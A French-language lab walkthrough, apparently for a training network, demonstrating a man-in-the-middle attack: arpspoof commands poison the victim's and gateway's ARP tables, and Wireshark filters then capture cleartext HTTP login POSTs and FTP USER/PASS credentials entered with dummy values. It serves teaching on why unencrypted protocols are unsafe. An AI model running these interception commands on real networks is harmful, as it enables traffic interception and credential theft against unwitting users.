# Attaque MITM avec ARP Spoofing et Capture de Trafic HTTP/FTP
---

##  Mise en place de l’attaque MITM
### Configuration du réseau
- **Attaquant** : `192.168.30.3`
- **Victime** : `192.168.30.1`
- **Passerelle** : `192.168.30.254`
- **Interface attaquante** : `ens3`

### 1.1 Activer le routage IP sur l'attaquant
```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

### 1.2 Lancer l'attaque ARP Spoofing
Empoisonner la table ARP de la victime et de la passerelle :
```bash
sudo arpspoof -i ens3 -t 192.168.30.1 -r 192.168.30.254 &
sudo arpspoof -i ens3 -t 192.168.30.254 -r 192.168.30.1 &
```
 **Résultat :** Tout le trafic entre la victime et la passerelle passe par l’attaquant.

---

## Capture des identifiants HTTP avec Wireshark
## 2.1 Filtrer le trafic HTTP
1. **Ouvrir Wireshark en root** :
```bash
sudo wireshark
```
2. **Sélectionner l’interface `ens3`**
3. **Appliquer un filtre HTTP** :
```plaintext
http
```

### 2.2 Se connecter à un site HTTP vulnérable
**Sur la machine victime (`192.168.30.1`)**, ouvre un navigateur et va sur :
```plaintext
http://testphp.vulnweb.com/login.php
```
1. **Entre un identifiant et un mot de passe bidon**
2. **Valide la connexion**

### 2.3 Récupérer les identifiants dans Wireshark
Dans **Wireshark**, recherche une requête HTTP **POST** contenant :
```plaintext
username=xxxxx&password=xxxxx
```
---

## Capture des identifiants FTP avec Wireshark
### 3.1 Filtrer le trafic FTP
1. **Appliquer un filtre FTP dans Wireshark** :
```plaintext
ftp
```

### 3.2 Connexion FTP depuis la victime
 **Sur la machine victime (`192.168.30.1`)**, exécute :
```bash
ftp 192.168.30.254
```
1. **Entre un identifiant bidon (`testuser`)**
2. **Entre un mot de passe (`password123`)**

###  3.3 Récupérer les identifiants dans Wireshark
Dans **Wireshark**, recherche des paquets FTP contenant :
```plaintext
USER testuser
PASS password123
```
**Les identifiants FTP sont capturés en clair !**

---

